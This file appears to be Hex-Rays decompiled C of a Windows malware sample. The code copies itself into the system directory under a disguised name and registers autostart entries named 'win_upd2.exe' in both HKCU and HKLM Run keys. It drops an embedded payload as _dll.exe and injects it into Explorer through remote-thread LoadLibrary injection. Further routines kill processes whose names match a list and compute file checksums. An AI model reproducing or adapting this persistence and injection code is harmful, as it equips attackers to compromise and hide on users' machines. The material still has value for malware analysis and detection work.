/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

HMODULE __stdcall sub_401000(LPCSTR lpLibFileName, int);
int __stdcall sub_401041(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite); // idb
void *__stdcall sub_40108D(DWORD dwProcessId, LPCSTR lpString);
LSTATUS __stdcall sub_401198(HKEY hKey);
void __noreturn start(); // weak
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall GetExitCodeThread(HANDLE hThread, LPDWORD lpExitCode);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes);
// void __stdcall Sleep(DWORD dwMilliseconds);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// int __stdcall lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);
// int __stdcall lstrlenA(LPCSTR lpString);
// HWND __stdcall FindWindowA(LPCSTR lpClassName, LPCSTR lpWindowName);
// DWORD __stdcall GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId);
// HINSTANCE __stdcall ShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// LSTATUS __stdcall RegCreateKeyA(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
char sub_403426();
unsigned int __stdcall sub_403447(int a1, _BYTE *a2, int a3);
int __stdcall sub_403479(int);
int __stdcall sub_403552(int);
int __stdcall sub_403609(const char *, int *);
int __stdcall sub_403655(void *, unsigned int);
int sub_403674();
int __stdcall sub_40368F(int);
int sub_4036B4();
int sub_403754();
int __stdcall sub_403772(int);
int __stdcall sub_4037EA(int);
int sub_4038A2();
int sub_4038C0();
int sub_4039B8();
int __stdcall sub_4039E4(_DWORD); // weak
int __stdcall sub_4039EA(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_4039F0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_4039F6(_DWORD, _DWORD); // weak
int __stdcall sub_4039FC(_DWORD); // weak
int sub_403A02(void); // weak
int __stdcall sub_403A08(_DWORD); // weak
int __stdcall sub_403A0E(_DWORD, _DWORD); // weak
int __stdcall sub_403A14(_DWORD, _DWORD); // weak
int __stdcall sub_403A20(_DWORD, _DWORD); // weak
int __stdcall sub_403A26(_DWORD); // weak
int __stdcall sub_403A2C(_DWORD); // weak
int __stdcall sub_403A32(_DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_403A38(_DWORD, _DWORD); // weak
int __stdcall sub_403A3E(_DWORD, _DWORD); // weak
int __stdcall sub_403A44(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_403A4A(_DWORD); // weak
int __stdcall sub_403A50(_DWORD, _DWORD); // weak
int __stdcall sub_403A56(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_403A5C(_DWORD); // weak
int __stdcall sub_403A62(_DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_403A68(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_403A74(_DWORD, _DWORD); // weak
int __stdcall sub_403A7A(_DWORD); // weak
int __stdcall sub_403A80(_DWORD); // weak
int __stdcall sub_403A86(_DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_403A8C(_DWORD, _DWORD, _DWORD); // weak
int __stdcall sub_403A92(_DWORD, _DWORD); // weak
int __stdcall sub_403A98(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak

//-------------------------------------------------------------------------
// Data declarations

CHAR ValueName[] = "win_upd2.exe"; // idb
CHAR String2[] = "\\WINdirect.exe"; // idb
CHAR aDllExe[] = "\\_dll.exe"; // idb
_UNKNOWN unk_403026; // weak
CHAR Operation[] = "open"; // idb
CHAR SubKey[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; // idb
CHAR ClassName[] = "Shell_TrayWnd"; // idb
CHAR ProcName[] = "LoadLibraryA"; // idb
CHAR LibFileName[] = "kernel32.dll"; // idb
int (__stdcall *dword_405EC8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_405ECC)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_405ED0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_405ED4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
DWORD dwProcessId = 0u; // idb
CHAR String[261] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
BYTE Data = 0u; // idb
CHAR Filename[3866]; // idb


//----- (00401000) --------------------------------------------------------
HMODULE __stdcall sub_401000(LPCSTR lpLibFileName, int a2)
{
  const char *v2; // edi
  HMODULE result; // eax
  HMODULE v5; // ebx

  v2 = lpLibFileName;
  result = LoadLibraryA(lpLibFileName);
  if ( result )
  {
    v5 = result;
    while ( 1 )
    {
      v2 += strlen(v2) + 1;
      if ( !*v2 )
        break;
      result = (HMODULE)GetProcAddress(v5, v2);
      *(_DWORD *)a2 = result;
      if ( !result )
        return result;
      a2 += 4;
    }
    return (HMODULE)1;
  }
  return result;
}

//----- (00401041) --------------------------------------------------------
int __stdcall sub_401041(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  int result; // eax
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-8h] BYREF
  HANDLE hFile; // [esp+4h] [ebp-4h]

  hFile = CreateFileA(lpFileName, 0x40000000u, 3u, 0, 2u, 0, 0);
  result = (int)hFile + 1;
  if ( hFile != (HANDLE)-1 )
  {
    WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
    CloseHandle(hFile);
    return 1;
  }
  return result;
}

//----- (0040108D) --------------------------------------------------------
void *__stdcall sub_40108D(DWORD dwProcessId, LPCSTR lpString)
{
  void *result; // eax
  DWORD v3; // ebx
  HMODULE ModuleHandleA; // eax
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // eax
  DWORD ExitCode; // [esp+4h] [ebp-18h] BYREF
  HANDLE hHandle; // [esp+8h] [ebp-14h]
  char v8[4]; // [esp+Ch] [ebp-10h] BYREF
  int v9; // [esp+10h] [ebp-Ch]
  int v10; // [esp+14h] [ebp-8h]
  HANDLE hObject; // [esp+18h] [ebp-4h]

  if ( sub_401000(LibFileName, (int)&dword_405EC8) )
  {
    result = OpenProcess(0x43Au, 0, dwProcessId);
    hObject = result;
    if ( result )
    {
      v9 = lstrlenA(lpString);
      v10 = dword_405EC8(hObject, 0, v9, 4096, 4);
      v3 = 0;
      if ( v10 )
      {
        if ( dword_405ED4(hObject, v10, lpString, v9, 0) )
        {
          ModuleHandleA = GetModuleHandleA(LibFileName);
          LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(ModuleHandleA, ProcName);
          hHandle = (HANDLE)dword_405ED0(hObject, 0, 0, LoadLibraryA, v10, 0, v8);
          if ( hHandle )
          {
            WaitForSingleObject(hHandle, 0xFFFFFFFF);
            GetExitCodeThread(hHandle, &ExitCode);
            v3 = ExitCode;
            CloseHandle(hHandle);
          }
        }
        dword_405ECC(hObject, v10, 0, 0x8000);
      }
      CloseHandle(hObject);
      return (void *)v3;
    }
  }
  else
  {
    result = ::LoadLibraryA(String);
    if ( result )
    {
      while ( 1 )
        Sleep(0x2710u);
    }
  }
  return result;
}
// 405EC8: using guessed type int (__stdcall *dword_405EC8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 405ECC: using guessed type int (__stdcall *dword_405ECC)(_DWORD, _DWORD, _DWORD, _DWORD);
// 405ED0: using guessed type int (__stdcall *dword_405ED0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 405ED4: using guessed type int (__stdcall *dword_405ED4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40108D: using guessed type char var_10[4];

//----- (00401198) --------------------------------------------------------
LSTATUS __stdcall sub_401198(HKEY hKey)
{
  int v1; // eax
  HKEY phkResult; // [esp+0h] [ebp-4h] BYREF

  RegCreateKeyA(hKey, SubKey, &phkResult);
  v1 = lstrlenA((LPCSTR)&Data);
  RegSetValueExA(phkResult, ValueName, 0, 1u, &Data, v1 + 1);
  return RegCloseKey(phkResult);
}

//----- (004011DD) --------------------------------------------------------
void __noreturn start()
{
  HWND WindowA; // eax

  GetSystemDirectoryA((LPSTR)&Data, 0x104u);
  lstrcatA((LPSTR)&Data, String2);
  GetModuleFileNameA(0, Filename, 0x104u);
  sub_401198(HKEY_CURRENT_USER);
  sub_401198(HKEY_LOCAL_MACHINE);
  if ( lstrcmpiA(Filename, (LPCSTR)&Data) )
  {
    SetFileAttributesA((LPCSTR)&Data, 0x80u);
    if ( CopyFileA(Filename, (LPCSTR)&Data, 0) )
    {
      SetFileAttributesA((LPCSTR)&Data, 0x80u);
      ShellExecuteA(0, Operation, (LPCSTR)&Data, 0, 0, 0);
    }
    ExitProcess(0);
  }
  GetSystemDirectoryA(String, 0x104u);
  lstrcatA(String, aDllExe);
  SetFileAttributesA(String, 0x80u);
  if ( sub_401041(String, &unk_403026, 0x2E00u) )
  {
    WindowA = FindWindowA(ClassName, 0);
    GetWindowThreadProcessId(WindowA, &dwProcessId);
    sub_40108D(dwProcessId, String);
  }
  ExitProcess(0);
}
// 4011DD: using guessed type void __noreturn start();

//----- (00403426) --------------------------------------------------------
char sub_403426()
{
  int v0; // eax
  unsigned int v1; // edx
  int v2; // ecx
  char v3; // cf

  v0 = 0;
  do
  {
    v1 = 2 * v0;
    v2 = 9;
    do
    {
      v3 = v1 & 1;
      v1 >>= 1;
      if ( v3 )
        v1 ^= 0xEDB88320;
      --v2;
    }
    while ( v2 );
    *(_DWORD *)(4 * v0 + 0x100049CC) = v1;
    LOBYTE(v0) = v0 + 1;
  }
  while ( (_BYTE)v0 );
  return v0;
}

//----- (00403447) --------------------------------------------------------
unsigned int __stdcall sub_403447(int a1, _BYTE *a2, int a3)
{
  unsigned int v3; // eax
  int i; // ecx

  v3 = ~a1;
  for ( i = a3; i; --i )
    v3 = (v3 >> 8) ^ *(_DWORD *)(4 * (unsigned __int8)(*a2++ ^ v3) + 0x100049CC);
  return ~v3;
}

//----- (00403479) --------------------------------------------------------
int __stdcall sub_403479(int a1)
{
  int v2; // [esp+0h] [ebp-8Ch]
  char v3[128]; // [esp+4h] [ebp-88h] BYREF
  int v4; // [esp+84h] [ebp-8h] BYREF
  int v5; // [esp+88h] [ebp-4h]

  v2 = 0;
  v5 = sub_4039EA(a1, 0x80000000, 3, 0, 3, 0, 0);
  if ( v5 != -1 )
  {
    do
    {
      sub_403A44(v5, v3, 128, &v4, 0);
      v2 = sub_403447(v2, v3, v4);
    }
    while ( v4 );
    sub_4039E4(v5);
  }
  return v2;
}
// 4039E4: using guessed type int __stdcall sub_4039E4(_DWORD);
// 4039EA: using guessed type int __stdcall sub_4039EA(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403A44: using guessed type int __stdcall sub_403A44(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00403552) --------------------------------------------------------
int __stdcall sub_403552(int a1)
{
  int v1; // ebx
  char v3[4]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+8h] [ebp-Ch] BYREF
  int v5; // [esp+Ch] [ebp-8h] BYREF
  int v6; // [esp+10h] [ebp-4h]

  v1 = 0;
  v6 = sub_4039EA(a1, -1073741824, 3, 0, 3, 0, 0);
  if ( v6 != -1 )
  {
    if ( sub_403A0E(v6, 0) >= 512 )
    {
      sub_403A56(v6, -4, 0, 2);
      sub_403A44(v6, &v4, 4, &v5, 0);
      sub_403A56(v6, -4, 0, 2);
      sub_403A4A(v6);
      v5 = sub_403479(a1);
      sub_403A56(v6, 0, 0, 2);
      sub_403A68(v6, &v4, 4, v3, 0);
      LOBYTE(v1) = v5 == v4;
    }
    sub_4039E4(v6);
  }
  return v1;
}
// 4039E4: using guessed type int __stdcall sub_4039E4(_DWORD);
// 4039EA: using guessed type int __stdcall sub_4039EA(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403A0E: using guessed type int __stdcall sub_403A0E(_DWORD, _DWORD);
// 403A44: using guessed type int __stdcall sub_403A44(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403A4A: using guessed type int __stdcall sub_403A4A(_DWORD);
// 403A56: using guessed type int __stdcall sub_403A56(_DWORD, _DWORD, _DWORD, _DWORD);
// 403A68: using guessed type int __stdcall sub_403A68(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403552: using guessed type char var_10[4];

//----- (00403609) --------------------------------------------------------
int __stdcall sub_403609(const char *a1, int *a2)
{
  int result; // eax
  int v3; // ebx
  const char *v4; // edi

  result = sub_403A2C(a1);
  if ( result )
  {
    v3 = result;
    v4 = a1;
    while ( 1 )
    {
      v4 += strlen(v4) + 1;
      if ( !*v4 )
        break;
      result = sub_403A14(v3, v4);
      if ( !result )
        return result;
      *a2++ = result;
    }
    return 1;
  }
  return result;
}
// 403A14: using guessed type int __stdcall sub_403A14(_DWORD, _DWORD);
// 403A2C: using guessed type int __stdcall sub_403A2C(_DWORD);

//----- (00403655) --------------------------------------------------------
int __stdcall sub_403655(void *a1, unsigned int a2)
{
  int result; // eax

  result = 0;
  memset(a1, 0, a2);
  return result;
}

//----- (00403674) --------------------------------------------------------
int sub_403674()
{
  int result; // eax

  while ( 1 )
  {
    result = sub_403A92(0, 0);
    if ( result )
      break;
    sub_403A5C(2000);
  }
  return result;
}
// 403A5C: using guessed type int __stdcall sub_403A5C(_DWORD);
// 403A92: using guessed type int __stdcall sub_403A92(_DWORD, _DWORD);

//----- (0040368F) --------------------------------------------------------
int __stdcall sub_40368F(int a1)
{
  int result; // eax
  int savedregs; // [esp+0h] [ebp+0h]

  result = sub_403A32(1, 0, a1);
  if ( result )
  {
    sub_403A62(result, 0, result);
    return sub_4039E4(savedregs);
  }
  return result;
}
// 4036AB: variable 'savedregs' is possibly undefined
// 4039E4: using guessed type int __stdcall sub_4039E4(_DWORD);
// 403A32: using guessed type int __stdcall sub_403A32(_DWORD, _DWORD, _DWORD);
// 403A62: using guessed type int __stdcall sub_403A62(_DWORD, _DWORD, _DWORD);

//----- (004036B4) --------------------------------------------------------
int sub_4036B4()
{
  int i; // eax
  int v1; // edi
  int v3; // [esp+4h] [ebp-12Ch]
  int v4[9]; // [esp+8h] [ebp-128h] BYREF
  char v5[260]; // [esp+2Ch] [ebp-104h] BYREF

  v4[0] = 296;
  v3 = sub_4039F6(2, 0);
  for ( i = sub_403A38(v3, v4); i; i = sub_403A3E(v3, v4) )
  {
    v1 = 268447927;
    do
    {
      if ( sub_403A74(v5, v1) )
        sub_40368F(v4[2]);
      v1 += strlen((const char *)v1) + 1;
    }
    while ( *(_BYTE *)v1 );
  }
  sub_4039E4(v3);
  return 0;
}
// 4039E4: using guessed type int __stdcall sub_4039E4(_DWORD);
// 4039F6: using guessed type int __stdcall sub_4039F6(_DWORD, _DWORD);
// 403A38: using guessed type int __stdcall sub_403A38(_DWORD, _DWORD);
// 403A3E: using guessed type int __stdcall sub_403A3E(_DWORD, _DWORD);
// 403A74: using guessed type int __stdcall sub_403A74(_DWORD, _DWORD);
// 4036B4: using guessed type char var_104[260];

//----- (00403754) --------------------------------------------------------
int sub_403754()
{
  char v1[4]; // [esp+0h] [ebp-4h] BYREF

  return sub_4039F0(0, 0, 268440345, 0, 0, v1);
}
// 4039F0: using guessed type int __stdcall sub_4039F0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 403754: using guessed type char var_4[4];

//----- (00403772) --------------------------------------------------------
int __stdcall sub_403772(int a1)
{
  int v1; // eax
  int v3; // [esp-4h] [ebp-10h]
  int v4; // [esp+0h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-8h] BYREF
  int v6; // [esp+8h] [ebp-4h]

  v5 = 4096;
  v6 = sub_403A20(64, 4096);
  v1 = sub_403A86(0, v6, &v5);
  v4 = v1;
  while ( v1 )
  {
    v3 = *(_DWORD *)(v6 + 4);
    if ( sub_403A74(v3, a1) )
      sub_403A7A(v3);
    v5 = 4096;
    v1 = sub_403A8C(v4, v6, &v5);
  }
  sub_403A80(v4);
  return sub_403A26(v6);
}
// 403A20: using guessed type int __stdcall sub_403A20(_DWORD, _DWORD);
// 403A26: using guessed type int __stdcall sub_403A26(_DWORD);
// 403A74: using guessed type int __stdcall sub_403A74(_DWORD, _DWORD);
// 403A7A: using guessed type int __stdcall sub_403A7A(_DWORD);
// 403A80: using guessed type int __stdcall sub_403A80(_DWORD);
// 403A86: using guessed type int __stdcall sub_403A86(_DWORD, _DWORD, _DWORD);
// 403A8C: using guessed type int __stdcall sub_403A8C(_DWORD, _DWORD, _DWORD);

//----- (004037EA) --------------------------------------------------------
int __stdcall sub_4037EA(int a1)
{
  sub_403A50(268455372, 128);
  sub_4039FC(268455372);
  sub_403772(a1);
  sub_403674();
  if ( sub_403A98(0, a1, 268455372, 0, 0) )
    return 0;
  else
    return sub_403552(268455372);
}
// 4039FC: using guessed type int __stdcall sub_4039FC(_DWORD);
// 403A50: using guessed type int __stdcall sub_403A50(_DWORD, _DWORD);
// 403A98: using guessed type int __stdcall sub_403A98(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004038A2) --------------------------------------------------------
int sub_4038A2()
{
  char v1[4]; // [esp+0h] [ebp-4h] BYREF

  return sub_4039F0(0, 0, 268440598, 0, 0, v1);
}
// 4039F0: using guessed type int __stdcall sub_4039F0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4038A2: using guessed type char var_4[4];

//----- (004038C0) --------------------------------------------------------
int sub_4038C0()
{
  int result; // eax
  int v1; // eax
  int v2; // eax
  int v3; // [esp+0h] [ebp-30h]
  char v4[8]; // [esp+8h] [ebp-28h] BYREF
  char v5[4]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+14h] [ebp-1Ch] BYREF
  char v7[8]; // [esp+18h] [ebp-18h] BYREF
  int v8; // [esp+20h] [ebp-10h]
  char v9[8]; // [esp+24h] [ebp-Ch] BYREF
  int v10; // [esp+2Ch] [ebp-4h]

  sub_403609((const char *)0x10003011, (int *)0x1000309F);
  result = sub_403609((const char *)0x1000307A, (int *)0x100030B3);
  if ( MEMORY[0x100030B3] )
  {
    v1 = sub_403A08(1);
    result = MEMORY[0x100030B3](v1);
  }
  if ( MEMORY[0x1000309F] && MEMORY[0x100030A3] && MEMORY[0x100030A7] && MEMORY[0x100030AB] )
  {
    if ( MEMORY[0x100030AF] )
    {
      sub_403655(v4, 8u);
      MEMORY[0x100030A3](v4, 8, 2);
      v2 = sub_403A02();
      MEMORY[0x100030AF](v2, 6, 4, 0, 0, v4, 0, v2);
      MEMORY[0x100030AB](v3, 40);
      MEMORY[0x100030A7](0, 268447744, v9);
      qmemcpy(v7, v9, sizeof(v7));
      v6 = 1;
      v8 = 2;
      return MEMORY[0x1000309F](v10, 0, &v6, 16, &v6, v5);
    }
  }
  return result;
}
// 40396B: variable 'v3' is possibly undefined
// 403A02: using guessed type int sub_403A02(void);
// 403A08: using guessed type int __stdcall sub_403A08(_DWORD);
// 1000309F: using guessed type int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100030A3: using guessed type int (__stdcall *)(_DWORD, _DWORD, _DWORD);
// 100030A7: using guessed type int (__stdcall *)(_DWORD, _DWORD, _DWORD);
// 100030AB: using guessed type int (__stdcall *)(_DWORD, _DWORD);
// 100030AF: using guessed type int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100030B3: using guessed type int (__stdcall *)(_DWORD);
// 4038C0: using guessed type char var_20[4];

//----- (004039B8) --------------------------------------------------------
int sub_4039B8()
{
  sub_4038C0();
  sub_403426();
  sub_403754();
  return sub_4038A2();
}

// nfuncs=76 queued=20 decompiled=20 lumina nreq=0 worse=0 better=0
// ALL OK, 20 function(s) have been successfully decompiled
